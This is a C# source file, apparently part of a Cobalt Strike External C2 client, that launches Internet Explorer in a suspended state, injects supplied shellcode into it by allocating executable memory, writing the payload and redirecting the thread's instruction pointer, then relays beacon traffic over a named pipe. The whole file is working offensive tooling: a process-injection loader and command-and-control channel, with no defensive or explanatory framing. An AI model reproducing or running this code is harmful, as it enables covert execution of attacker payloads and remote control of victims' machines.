using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace C2Bus
{
    internal class ExternalC2
    {
        private NamedPipeClientStream beaconPipe;
        private string beaconPipeName;
        private byte[] shellcode;

        public ExternalC2(byte[] shellcode, string pipeName)
        {
            this.beaconPipeName = pipeName;
            this.shellcode = shellcode;
        }

        public void Start()
        {
            // Inject our shellcode into IE
            LowLevel.Launch("C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", this.shellcode);

            // Connect to the spawned named pipe
            beaconPipe = new NamedPipeClientStream(".", this.beaconPipeName, PipeDirection.InOut);
            beaconPipe.Connect();
        }

        public byte[] RecvDataFromBeacon()
        {
            try
            {
                byte[] datalen = new byte[4];

                beaconPipe.Read(datalen, 0, datalen.Length);
                int bytesToRead = BitConverter.ToInt32(datalen, 0);
                byte[] data = new byte[bytesToRead];
                beaconPipe.Read(data, 0, bytesToRead);
                return (data);
            }
            catch
            {
                throw new CSException("Beacon connection closed");
            }
        }

        public void SendDataToBeacon(byte[] data)
        {
            try
            {
                beaconPipe.Write(BitConverter.GetBytes(data.Length), 0, 4);
                beaconPipe.Write(data, 0, data.Length);
            }
            catch
            {
                throw new CSException("Beacon connection closed");
            }
        }

        public class CSException : Exception
        {
            private string message;

            public CSException(string message)
            {
                this.message = message;
            }
        }
    }

    internal static class LowLevel
    {
        public static void Launch(string process, byte[] shellcode)
        {
            int procID = 0;
            UIntPtr bytesWritten;

            int threadId = LowLevel.RunProcess(process, out procID);
            IntPtr threadHandle = Unmanaged.OpenThread(Unmanaged.ThreadAccess.THREAD_ALL, false, (uint)threadId);

            Unmanaged.CONTEXT threadContext = new Unmanaged.CONTEXT();
            threadContext.ContextFlags = (uint)Unmanaged.CONTEXT_FLAGS.CONTEXT_FULL;
            Unmanaged.GetThreadContext(threadHandle, ref threadContext);

            IntPtr procHandle = Unmanaged.OpenProcess(Unmanaged.PROCESS_CREATE_THREAD |
                                                      Unmanaged.PROCESS_QUERY_INFORMATION |
                                                      Unmanaged.PROCESS_VM_OPERATION |
                                                      Unmanaged.PROCESS_VM_WRITE |
                                                      Unmanaged.PROCESS_VM_READ,
                                                      false,
                                                      procID
                                                      );

            IntPtr allocMem = Unmanaged.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, Unmanaged.MEM_COMMIT | Unmanaged.MEM_RESERVE, Unmanaged.PAGE_EXECUTE_READWRITE);

            Unmanaged.WriteProcessMemory(procHandle, allocMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            threadContext.Eip = (uint)allocMem.ToInt32();

            Unmanaged.SetThreadContext(threadHandle, ref threadContext);
            Unmanaged.ResumeThread(threadHandle);
        }

        private static int RunProcess(string proc, out int procID)
        {
            procID = 0;
            var startInfo = new Unmanaged.STARTUPINFO();
            var processInfo = new Unmanaged.PROCESS_INFORMATION();

            startInfo.cb = (uint)Marshal.SizeOf(startInfo);

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var processSecurity = new Unmanaged.SECURITY_ATTRIBUTES();
                var threadSecurity = new Unmanaged.SECURITY_ATTRIBUTES();
                processSecurity.nLength = Marshal.SizeOf(processSecurity);
                threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

                Unmanaged.CreateProcess(
                    proc,
                    null,
                    ref processSecurity,
                    ref threadSecurity,
                    false,
                    (uint)Unmanaged.CreationFlags.CreateSuspended,
                    IntPtr.Zero,
                    null,
                    ref startInfo,
                    out processInfo
                    );

                procID = processInfo.dwProcessId;
                return processInfo.dwThreadId;
            }
            catch (Exception)
            {
                return 0;
            }
            finally
            {
                Marshal.FreeHGlobal(lpValue);
            }
        }
    }

    internal class Unmanaged
    {
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        public static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        public const int PROCESS_CREATE_THREAD = 0x0002;
        public const int PROCESS_QUERY_INFORMATION = 0x0400;
        public const int PROCESS_VM_OPERATION = 0x0008;
        public const int PROCESS_VM_WRITE = 0x0020;
        public const int PROCESS_VM_READ = 0x0010;

        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;
        public const uint PAGE_READWRITE = 4;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;

            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value

            // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;

            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;

            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;

            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;

            public uint SegFs;
            public uint SegEs;
            public uint SegDs;

            // Retrieved by CONTEXT_INTEGER
            public uint Edi;

            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;

            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;

            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;

            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;

            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum CreationFlags : uint
        {
            CreateSuspended = 0x00000004,
            DetachedProcess = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }
    }
}